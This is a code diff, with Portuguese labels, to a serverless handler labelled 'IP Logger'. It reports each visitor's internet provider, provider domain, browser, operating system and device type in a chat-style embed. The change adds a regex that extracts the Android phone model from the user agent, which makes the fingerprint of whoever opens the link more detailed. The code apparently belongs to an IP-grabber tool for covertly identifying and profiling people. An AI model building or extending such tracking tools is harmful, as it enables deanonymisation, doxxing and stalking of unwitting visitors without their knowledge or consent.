@@ -15,7 +15,7 @@ export default async function handler(req, res) {
 
     const userAgent = req.headers["user-agent"] || "Desconhecido";
 
-    // 🔍 Parser simples de User Agent
+    // 🔍 Parser simples de User Agent + Modelo
     function parseUserAgent(ua) {
         let browser = "Desconhecido";
         if (ua.includes("Chrome")) browser = "Chrome";
@@ -31,12 +31,19 @@ export default async function handler(req, res) {
         else if (ua.includes("Mac OS")) os = "Mac OS";
         else if (ua.includes("Linux")) os = "Linux";
 
-        const device = ua.includes("Mobile") ? "Celular" : "Desktop";
+        const deviceType = ua.includes("Mobile") ? "Celular" : "Desktop";
 
-        return { browser, os, device };
+        // 🔍 Extrair modelo do dispositivo (Android)
+        let model = "Desconhecido";
+        const match = ua.match(/;\s?([A-Za-z0-9\-]+)\s?Build/i);
+        if (match && match[1]) {
+            model = match[1];
+        }
+
+        return { browser, os, deviceType, model };
     }
 
-    const { browser, os, device } = parseUserAgent(userAgent);
+    const { browser, os, deviceType, model } = parseUserAgent(userAgent);
 
     const embed = {
         embeds: [
@@ -53,11 +60,12 @@ export default async function handler(req, res) {
 > **Provedor:** ${isp}
 > **Domínio do Provedor:** \`${domain}\`
 
-**🧠 Informações do Navegador**
+**🧠 Informações do Navegador e Dispositivo**
 > **User Agent:** \`${userAgent}\`
 > **Navegador:** ${browser}
 > **Sistema Operacional:** ${os}
-> **Dispositivo:** ${device}
+> **Tipo de Dispositivo:** ${deviceType}
+> **Modelo:** ${model}
                 `,
                 footer: { text: "IP Logger" },
                 timestamp: new Date().toISOString()
